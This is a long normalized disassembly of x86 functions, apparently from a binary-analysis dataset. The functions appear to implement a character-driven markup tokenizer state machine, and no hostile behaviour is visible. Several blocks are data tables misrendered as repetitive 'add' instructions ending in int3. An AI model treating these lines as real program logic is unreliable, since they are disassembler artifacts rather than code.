mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10073350
mov eax [ ebp + 0x14 ]
push esi
mov esi [ r--data ]
call sub_100736e0
add esp 0x8
pop esi
xor eax eax
pop edi
pop ebp
retn
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
add eax 0x94
push eax
call sub_1003c6e0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_100736e0
add esp 0x8
pop esi
mov eax 0x1
pop edi
pop ebp
retn
sub_100743c0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push ebx
push esi
cmp eax 0x21
je r-xdata
mov esi [ ebp + 0x8 ]
mov edx [ esi + 0x8 ]
push edi
mov [ edx ] 0x2c
mov edi [ esi + 0x8 ]
lea eax [ edi + 0x94 ]
push eax
call sub_10010000
lea ebx [ edi + 0x10 ]
push ebx
push esi
call sub_1004b8a0
push ebx
push esi
call sub_10041660
add edi 0x20
push edi
push esi
call sub_1004b8a0
push edi
push esi
call sub_10041660
add esp 0x24
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
cmp eax 0x2f
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
mov [ edx ] 0x8
mov ecx [ eax + 0x8 ]
add ecx 0x10
push ecx
push 0x2f
push eax
call sub_10016b30
add esp 0xc
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
cmp eax 0x3f
je r-xdata
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
mov [ eax ] 0x2b
call sub_100734d0
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push 0x3f
push esi
call sub_10016b30
push 0x8
mov eax esi
call sub_10073350
add esp 0x10
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
cmp eax 0x41
jl r-xdata
add eax 0xffffff9f
cmp eax 0x19
ja r-xdata
cmp eax 0x5a
jle r-xdata
mov ebx [ ebp + 0x8 ]
push 0xa
mov eax ebx
call sub_10073350
mov edx [ ebp + 0x14 ]
mov ecx [ ebx + 0x8 ]
push edx
mov [ ecx ] 0x0
call sub_10073a80
add esp 0x8
pop esi
xor eax eax
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
push 0x1
mov [ eax ] 0x9
call sub_10073af0
add esp 0x4
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
sub_100744e0
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x10 ]
cmp edi 0xffffffff
je r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
push 0xc
mov eax ebx
call sub_10073350
mov eax [ ebp + 0x14 ]
mov edx [ ebx + 0x8 ]
push eax
mov [ edx ] 0x0
call sub_10073a80
add esp 0x8
pop ebx
pop edi
pop ebp
retn
push esi
cmp edi 0x3e
je r-xdata
mov esi [ ebp + 0x8 ]
push 0xb
mov eax esi
call sub_10073350
mov ecx [ esi + 0x8 ]
add esp 0x4
pop esi
mov [ ecx ] 0x0
mov eax 0x2
pop edi
pop ebp
retn
cmp edi 0x41
jl r-xdata
lea eax [ edi - 0x61 ]
cmp eax 0x19
ja r-xdata
cmp edi 0x5a
jle r-xdata
mov esi [ ebp + 0x8 ]
push 0xd
mov eax esi
call sub_10073350
mov edx [ esi + 0x8 ]
mov [ edx ] 0x2b
call sub_100734d0
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push edi
push esi
call sub_10016b30
add esp 0x10
pop esi
mov eax 0x2
pop edi
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
push 0x0
mov [ ecx ] 0x9
call sub_10073af0
add esp 0x4
pop esi
mov eax 0x2
pop edi
pop ebp
retn
sub_100745b0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push ebx
lea ecx [ eax + 0x1 ]
push esi
push edi
cmp ecx 0x3f
ja r-xdata
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
movzx ecx [ ecx + lookup_table_1007471c ]
jmp [ ecx * 4 + jump_table_10074704 ]
mov edx [ ebp + 0x8 ]
mov esi [ edx + 0x8 ]
cmp [ esi + 0x40 ] 0x0
lea edi [ esi + 0x3c ]
mov [ ebp + 0x10 ] eax
jne r-xdata
add eax 0x20
mov esi [ ebp + 0x8 ]
call sub_10073b90
mov edx [ esi + 0x8 ]
pop edi
pop esi
mov [ edx ] 0x21
mov eax 0x2
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
call sub_10073b90
mov eax [ esi + 0x8 ]
pop edi
pop esi
mov [ eax ] 0x2a
mov eax 0x2
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
call sub_10073b90
mov ecx [ esi + 0x8 ]
mov edi [ ebp + 0x14 ]
push esi
mov [ ecx ] 0x0
call sub_10073810
add esp 0x4
pop edi
pop esi
pop ebx
pop ebp
retn
mov edi [ ebp + 0x8 ]
push 0x2
mov eax edi
call sub_10073350
mov esi [ edi + 0x8 ]
mov edx [ r--data ]
lea ebx [ esi + 0x3c ]
add esp 0x4
cmp [ ebx + 0x4 ] 0x0
mov [ ebp + 0x10 ] edx
jne r-xdata
mov ebx [ ebp + 0x8 ]
push 0x9
mov eax ebx
call sub_10073350
add esp 0x4
call sub_10073950
mov eax [ ebx + 0x8 ]
pop edi
pop esi
mov [ eax ] 0x0
mov eax 0x2
pop ebx
pop ebp
retn
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
push edi
push ecx
push edx
call sub_10016b30
add esp 0xc
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
lea eax [ esi + 0x50 ]
push eax
lea ebx [ esi + 0x94 ]
push ebx
call sub_10037120
push ebx
call sub_1004ac70
add esp 0xc
mov [ esi + 0x48 ] eax
mov edx [ ebp + 0x10 ]
push ebx
push edx
push edi
call sub_10016b30
add esp 0xc
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
lea ecx [ esi + 0x50 ]
lea eax [ esi + 0x94 ]
push ecx
push eax
call sub_10037120
lea eax [ esi + 0x94 ]
push eax
call sub_1004ac70
add esp 0xc
mov [ esi + 0x48 ] eax
sub_10074722
add eax 0x2050505
add al [ 0x5050502 ]
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050502
add eax 0x5050505
add eax 0x5050505
add eax 0x5050503
add eax 0x5050505
add eax 0x5050505
add eax 0xcccccc04
int3
sub_10074760
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x2f
jne r-xdata
mov edx [ ebp + 0x14 ]
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x8 ]
mov [ eax ] 0x2
push edx
mov [ ecx + 0x4 ] 0x1
call sub_10073a80
add esp 0x4
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0xb
mov edx [ eax + 0x8 ]
add edx 0x10
push edx
push 0x2f
push eax
call sub_10016b30
add esp 0xc
mov eax 0x2
pop ebp
retn
sub_100747c0
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x10 ]
cmp edi 0x41
jl r-xdata
lea eax [ edi - 0x61 ]
cmp eax 0x19
ja r-xdata
cmp edi 0x5a
jle r-xdata
mov ecx [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x8 ]
push ecx
mov [ eax ] 0x2
call sub_10073a80
add esp 0x4
pop ebx
pop edi
pop ebp
retn
push esi
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
push 0x0
mov [ ecx ] 0xc
call sub_10073af0
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push edi
push esi
call sub_10016b30
add esp 0x10
pop esi
mov eax 0x2
pop edi
pop ebp
retn
sub_10074830
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x10 ]
push esi
push edi
cmp ebx 0x41
jl r-xdata
lea eax [ ebx - 0x61 ]
cmp eax 0x19
ja r-xdata
cmp ebx 0x5a
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi [ esi + 0x8 ]
add edi 0x3c
push edi
push 0x0
push esi
call sub_10016b30
dec [ edi + 0x4 ]
add esp 0xc
cmp [ edi + 0x34 ] 0x96
je r-xdata
lea ecx [ ebx - 0x41 ]
cmp ecx 0x19
ja r-xdata
mov eax [ esi + 0x8 ]
mov ebx esi
mov [ eax ] 0x2
call sub_10073950
mov ecx [ ebp + 0x14 ]
push ecx
call sub_10073a80
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ edi ]
push ecx
call sub_1003fdd0
add esp 0x4
cmp [ edi + 0x34 ] eax
jne r-xdata
mov [ ebp + 0x10 ] ebx
lea edx [ ebx + 0x20 ]
mov [ ebp + 0x10 ] edx
jmp r-xdata
lea eax [ ebx - 0x9 ]
cmp eax 0x35
ja r-xdata
mov edx [ ebp + 0x10 ]
push eax
push edx
push esi
call sub_10016b30
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push ebx
push esi
call sub_10016b30
add esp 0x18
pop edi
pop esi
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ edi + 0x50 ]
lea eax [ edi + 0x94 ]
push ecx
push eax
call sub_10037120
lea eax [ edi + 0x94 ]
push eax
call sub_1004ac70
mov [ edi + 0x48 ] eax
mov eax [ ebp - 0x4 ]
add esp 0xc
mov esi [ ebp + 0x8 ]
mov edi [ esi + 0x8 ]
cmp [ edi + 0x40 ] 0x0
lea eax [ edi + 0x3c ]
mov [ ebp - 0x4 ] eax
jne r-xdata
movzx edx [ eax + lookup_table_10074990 ]
jmp [ edx * 4 + jump_table_10074980 ]
call sub_10073b90
mov eax [ esi + 0x8 ]
pop edi
pop esi
mov [ eax ] 0x21
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
call sub_10073b90
mov ecx [ esi + 0x8 ]
pop edi
pop esi
mov [ ecx ] 0x2a
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
call sub_10073b90
mov edx [ esi + 0x8 ]
mov edi [ ebp + 0x14 ]
push esi
mov [ edx ] 0x0
call sub_10073810
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10074994
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ eax ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add [ ebx ] eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ edx ]
int3
sub_100749d0
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x2f
jne r-xdata
mov edx [ ebp + 0x14 ]
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x8 ]
mov [ eax ] 0x4
push edx
mov [ ecx + 0x4 ] 0x1
call sub_10073a80
add esp 0x4
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0xe
mov edx [ eax + 0x8 ]
add edx 0x10
push edx
push 0x2f
push eax
call sub_10016b30
add esp 0xc
mov eax 0x2
pop ebp
retn
sub_10074a30
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x10 ]
cmp edi 0x41
jl r-xdata
lea eax [ edi - 0x61 ]
cmp eax 0x19
ja r-xdata
cmp edi 0x5a
jle r-xdata
mov ecx [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x8 ]
push ecx
mov [ eax ] 0x4
call sub_10073a80
add esp 0x4
pop ebx
pop edi
pop ebp
retn
push esi
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
push 0x0
mov [ ecx ] 0xf
call sub_10073af0
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push edi
push esi
call sub_10016b30
add esp 0x10
pop esi
mov eax 0x2
pop edi
pop ebp
retn
sub_10074aa0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x3c ]
mov edx [ eax + 0x40 ]
push ebx
push esi
push edi
push ecx
push edx
push r--data
call sub_1003bee0
mov ebx [ ebp + 0x10 ]
add esp 0xc
cmp ebx 0x41
jl r-xdata
lea eax [ ebx - 0x61 ]
cmp eax 0x19
ja r-xdata
cmp ebx 0x5a
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi [ esi + 0x8 ]
add edi 0x3c
push edi
push 0x0
push esi
call sub_10016b30
dec [ edi + 0x4 ]
add esp 0xc
cmp [ edi + 0x34 ] 0x96
je r-xdata
lea ecx [ ebx - 0x41 ]
cmp ecx 0x19
ja r-xdata
mov eax [ esi + 0x8 ]
mov ebx esi
mov [ eax ] 0x4
call sub_10073950
mov ecx [ ebp + 0x14 ]
push ecx
call sub_10073a80
add esp 0x4
pop edi
pop esi
pop ebx
pop ebp
retn
mov ecx [ edi ]
push ecx
call sub_1003fdd0
add esp 0x4
cmp [ edi + 0x34 ] eax
jne r-xdata
mov [ ebp + 0xc ] ebx
lea edx [ ebx + 0x20 ]
mov [ ebp + 0xc ] edx
jmp r-xdata
push r--data
call sub_1003bee0
lea eax [ ebx - 0x9 ]
add esp 0x4
cmp eax 0x35
ja r-xdata
mov edx [ ebp + 0xc ]
push eax
push edx
push esi
call sub_10016b30
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push ebx
push esi
call sub_10016b30
add esp 0x18
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
lea ecx [ edi + 0x50 ]
lea eax [ edi + 0x94 ]
push ecx
push eax
call sub_10037120
lea eax [ edi + 0x94 ]
push eax
call sub_1004ac70
mov [ edi + 0x48 ] eax
mov eax [ ebp + 0x10 ]
add esp 0xc
mov esi [ ebp + 0x8 ]
mov edi [ esi + 0x8 ]
cmp [ edi + 0x40 ] 0x0
lea eax [ edi + 0x3c ]
mov [ ebp + 0x10 ] eax
jne r-xdata
movzx edx [ eax + lookup_table_10074c1c ]
jmp [ edx * 4 + jump_table_10074c0c ]
call sub_10073b90
mov eax [ esi + 0x8 ]
pop edi
pop esi
mov [ eax ] 0x21
mov eax 0x2
pop ebx
pop ebp
retn
call sub_10073b90
mov ecx [ esi + 0x8 ]
pop edi
pop esi
mov [ ecx ] 0x2a
mov eax 0x2
pop ebx
pop ebp
retn
call sub_10073b90
mov edx [ esi + 0x8 ]
mov edi [ ebp + 0x14 ]
push esi
mov [ edx ] 0x0
call sub_10073810
add esp 0x4
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10074c20
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ eax ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add [ ebx ] eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ edx ]
int3
sub_10074c60
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
cmp eax 0x2f
jne r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
cmp eax 0x21
mov eax [ ebx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0x11
mov edx [ eax + 0x8 ]
add edx 0x10
push edx
push 0x2f
push eax
call sub_10016b30
add esp 0xc
mov eax 0x2
pop ebp
retn
mov edx [ ebp + 0x14 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x5
push edx
mov [ ecx + 0x4 ] 0x1
call sub_10073a80
add esp 0x4
pop ebx
pop ebp
retn
mov [ eax ] 0x13
mov ecx [ ebx + 0x8 ]
add ecx 0x10
push ecx
push 0x21
push ebx
call sub_10016b30
mov edx [ ebp + 0x14 ]
push edx
call sub_10073a80
add esp 0x10
pop ebx
pop ebp
retn
sub_10074ce0
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x10 ]
cmp edi 0x41
jl r-xdata
lea eax [ edi - 0x61 ]
cmp eax 0x19
ja r-xdata
cmp edi 0x5a
jle r-xdata
mov ecx [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x8 ]
push ecx
mov [ eax ] 0x5
call sub_10073a80
add esp 0x4
pop ebx
pop edi
pop ebp
retn
push esi
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
push 0x0
mov [ ecx ] 0x12
call sub_10073af0
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push edi
push esi
call sub_10016b30
add esp 0x10
pop esi
mov eax 0x2
pop edi
pop ebp
retn
sub_10074d50
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x10 ]
push esi
push edi
cmp ebx 0x41
jl r-xdata
lea eax [ ebx - 0x61 ]
cmp eax 0x19
ja r-xdata
cmp ebx 0x5a
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi [ esi + 0x8 ]
add edi 0x3c
push edi
push 0x0
push esi
call sub_10016b30
dec [ edi + 0x4 ]
add esp 0xc
cmp [ edi + 0x34 ] 0x96
je r-xdata
lea ecx [ ebx - 0x41 ]
cmp ecx 0x19
ja r-xdata
mov eax [ esi + 0x8 ]
mov ebx esi
mov [ eax ] 0x5
call sub_10073950
mov ecx [ ebp + 0x14 ]
push ecx
call sub_10073a80
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ edi ]
push ecx
call sub_1003fdd0
add esp 0x4
cmp [ edi + 0x34 ] eax
jne r-xdata
mov [ ebp + 0x10 ] ebx
lea edx [ ebx + 0x20 ]
mov [ ebp + 0x10 ] edx
jmp r-xdata
lea eax [ ebx - 0x9 ]
cmp eax 0x35
ja r-xdata
mov edx [ ebp + 0x10 ]
push eax
push edx
push esi
call sub_10016b30
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push ebx
push esi
call sub_10016b30
add esp 0x18
pop edi
pop esi
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ edi + 0x50 ]
lea eax [ edi + 0x94 ]
push ecx
push eax
call sub_10037120
lea eax [ edi + 0x94 ]
push eax
call sub_1004ac70
mov [ edi + 0x48 ] eax
mov eax [ ebp - 0x4 ]
add esp 0xc
mov esi [ ebp + 0x8 ]
mov edi [ esi + 0x8 ]
cmp [ edi + 0x40 ] 0x0
lea eax [ edi + 0x3c ]
mov [ ebp - 0x4 ] eax
jne r-xdata
movzx edx [ eax + lookup_table_10074eb0 ]
jmp [ edx * 4 + jump_table_10074ea0 ]
call sub_10073b90
mov eax [ esi + 0x8 ]
pop edi
pop esi
mov [ eax ] 0x21
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
call sub_10073b90
mov ecx [ esi + 0x8 ]
pop edi
pop esi
mov [ ecx ] 0x2a
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
call sub_10073b90
mov edx [ esi + 0x8 ]
mov edi [ ebp + 0x14 ]
push esi
mov [ edx ] 0x0
call sub_10073810
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10074eb4
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ eax ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add [ ebx ] eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ edx ]
int3
sub_10074ef0
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x2d
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x5
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
pop ebp
retn
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
mov [ eax ] 0x14
mov ecx [ edi + 0x8 ]
add ecx 0x94
push ecx
call sub_1003c6e0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_100736e0
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
sub_10074f50
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x2d
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x5
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
pop ebp
retn
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
mov [ eax ] 0x17
mov ecx [ edi + 0x8 ]
add ecx 0x94
push ecx
call sub_1003c6e0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_100736e0
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
sub_10074fb0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
lea eax [ edi + 0x1 ]
cmp eax 0x3d
ja r-xdata
mov edi [ ebp + 0x8 ]
movzx eax [ eax + lookup_table_100750a0 ]
jmp [ eax * 4 + jump_table_1007508c ]
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
mov [ ecx ] 0x16
jmp r-xdata
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
mov [ eax ] 0x18
call sub_100734d0
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push edi
push esi
call sub_10016b30
add esp 0xc
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10073350
mov eax [ ebp + 0x14 ]
push esi
mov esi [ r--data ]
call sub_100736e0
add esp 0x8
pop edi
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0xe
mov eax esi
call sub_10073350
mov edi [ ebp + 0x14 ]
add esp 0x4
mov eax esi
mov [ edi ] 0x7
mov [ edi + 0x18 ] 0xffffffff
call sub_10073590
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov edx [ edi + 0x8 ]
add edx 0x94
push edx
call sub_1003c6e0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_100736e0
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
sub_100750a5
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add ecx esp
int3
sub_100750e0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
lea eax [ edi + 0x1 ]
cmp eax 0x3d
ja r-xdata
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
mov [ ecx ] 0x15
movzx eax [ eax + lookup_table_100751d4 ]
jmp [ eax * 4 + jump_table_100751c0 ]
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
mov [ ecx ] 0x17
jmp r-xdata
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
mov [ eax ] 0x18
call sub_100734d0
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push edi
push esi
call sub_10016b30
add esp 0xc
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov edx [ esi + 0x8 ]
push 0x2
mov eax esi
mov [ edx ] 0x15
call sub_10073350
mov eax [ ebp + 0x14 ]
push esi
mov esi [ r--data ]
call sub_100736e0
add esp 0x8
pop edi
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0xe
mov eax esi
call sub_10073350
mov eax [ esi + 0x8 ]
add esp 0x4
pop edi
mov [ eax ] 0x0
mov eax 0x2
pop esi
pop ebp
retn
mov edx [ edi + 0x8 ]
add edx 0x94
push edx
call sub_1003c6e0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_100736e0
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
sub_100751d9
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add ecx esp
int3
sub_10075220
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
lea eax [ edi + 0x1 ]
cmp eax 0x3f
ja r-xdata
mov edi [ ebp + 0x8 ]
mov edx [ edi + 0x8 ]
mov [ edx ] 0x15
mov eax [ edi + 0x8 ]
add eax 0x94
push eax
movzx eax [ eax + lookup_table_10075330 ]
jmp [ eax * 4 + jump_table_10075318 ]
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
add ecx 0x94
push ecx
jmp r-xdata
mov esi [ ebp + 0x8 ]
mov edx [ esi + 0x8 ]
mov [ edx ] 0x18
call sub_100734d0
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push edi
push esi
call sub_10016b30
add esp 0xc
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
mov [ ecx ] 0x5
mov edx [ edi + 0x8 ]
add edx 0x94
push edx
jmp r-xdata
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
mov [ eax ] 0x15
push 0x2
mov eax esi
call sub_10073350
mov eax [ ebp + 0x14 ]
push esi
mov esi [ r--data ]
call sub_100736e0
add esp 0x8
pop edi
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0xe
mov eax esi
call sub_10073350
mov ecx [ esi + 0x8 ]
add esp 0x4
pop edi
mov [ ecx ] 0x0
mov eax 0x2
pop esi
pop ebp
retn
call sub_1003c6e0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_100736e0
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
sub_10075336
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add al [ 0x5050505 ]
add eax 0x5050505
add eax 0x3050505
add eax 0xec8b5504
push esi
mov esi [ ebp + 0x10 ]
cmp esi 0x2f
jne r-xdata
push ebx
cmp esi 0x41
jl r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0x19
mov edx [ eax + 0x8 ]
add edx 0x10
push edx
push esi
push eax
call sub_10016b30
add esp 0xc
lea eax [ esi - 0x2d ]
pop esi
pop ebp
retn
lea eax [ esi - 0x61 ]
cmp eax 0x19
ja r-xdata
cmp esi 0x5a
jle r-xdata
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x14 ]
mov eax [ ebx + 0x8 ]
push ecx
mov [ eax ] 0x15
call sub_10073a80
add esp 0x4
pop ebx
pop esi
pop ebp
retn
mov ebx [ ebp + 0x8 ]
mov ecx [ ebx + 0x8 ]
mov [ ecx ] 0x1b
mov edx [ ebx + 0x8 ]
add edx 0x10
push edx
push esi
push ebx
call sub_10016b30
lea eax [ esi - 0x41 ]
add esp 0xc
cmp eax 0x19
ja r-xdata
mov ecx [ ebp + 0xc ]
add ecx 0x20
push ecx
push esi
push ebx
call sub_10016b30
mov edx [ ebp + 0x14 ]
push edx
call sub_10073a80
add esp 0x10
pop ebx
pop esi
pop ebp
retn
add esi 0x20
sub_10075420
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x10 ]
cmp edi 0x41
jl r-xdata
lea eax [ edi - 0x61 ]
cmp eax 0x19
ja r-xdata
cmp edi 0x5a
jle r-xdata
mov ecx [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x8 ]
push ecx
mov [ eax ] 0x15
call sub_10073a80
add esp 0x4
pop ebx
pop edi
pop ebp
retn
push esi
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
push 0x0
mov [ ecx ] 0x1a
call sub_10073af0
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push edi
push esi
call sub_10016b30
add esp 0x10
pop esi
mov eax 0x2
pop edi
pop ebp
retn
sub_10075490
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x10 ]
push esi
push edi
cmp ebx 0x41
jl r-xdata
lea eax [ ebx - 0x61 ]
cmp eax 0x19
ja r-xdata
cmp ebx 0x5a
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi [ esi + 0x8 ]
add edi 0x3c
push edi
push 0x0
push esi
call sub_10016b30
dec [ edi + 0x4 ]
add esp 0xc
cmp [ edi + 0x34 ] 0x96
je r-xdata
lea ecx [ ebx - 0x41 ]
cmp ecx 0x19
ja r-xdata
mov eax [ esi + 0x8 ]
